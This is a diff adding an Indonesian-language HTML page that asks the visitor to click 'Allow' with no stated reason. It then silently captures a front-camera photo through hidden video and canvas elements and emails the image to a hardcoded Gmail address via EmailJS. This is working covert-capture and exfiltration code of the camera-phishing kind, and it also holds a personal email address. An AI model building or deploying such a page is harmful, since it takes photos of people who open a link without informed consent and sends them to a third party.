@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ambil Foto Otomatis</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial;
+      background: #000;
+      color: #fff;
+      margin-top: 50px;
+    }
+    .loading { font-size: 20px; }
+    .error { color: red; }
+  </style>
+</head>
+<body>
+  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+  <div class="loading">Mohon klik 'Allow' di pop-up untuk mulai...</div>
+  <div id="message"></div>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // Inisialisasi EmailJS (ganti sama ID-mu)
+    emailjs.init("your_user_id");
+
+    const messageDiv = document.getElementById('message');
+
+    // Coba akses kamera depan
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }
+      })
+      .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        messageDiv.innerHTML = "<p class='loading'>Kamera aktif! Ambil foto dalam 2 detik...</p>";
+        setTimeout(takePhoto, 2000);
+      })
+      .catch(err => {
+        console.log("Error: ", err);
+        messageDiv.innerHTML = "<p class='error'>Gagal akses kamera. Klik 'Allow' di pop-up browser atau cek pengaturan kamera, lalu refresh!</p>";
+      });
+    }
+
+    // Ambil foto
+    function takePhoto() {
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+      context.drawImage(document.getElementById('video'), 0, 0, 640, 480);
+      const imageData = canvas.toDataURL('image/png');
+
+      video.srcObject.getTracks().forEach(track => track.stop());
+      messageDiv.innerHTML = "<p class='loading'>Mengirim foto...</p>";
+      sendEmail(imageData);
+    }
+
+    // Kirim email
+    function sendEmail(imageData) {
+      emailjs.send("your_service_id", "your_template_id", {
+        to_email: "nadirnadhir76@gmail.com",
+        image: imageData
+      })
+      .then(() => {
+        messageDiv.innerHTML = "<h3>Foto terkirim ke Gmail!</h3>";
+      })
+      .catch(err => {
+        messageDiv.innerHTML = "<p class='error'>Gagal kirim email: " + err + "</p>";
+      });
+    }
+
+    // Mulai otomatis
+    startCamera();
+  </script>
+</body>
+</html>
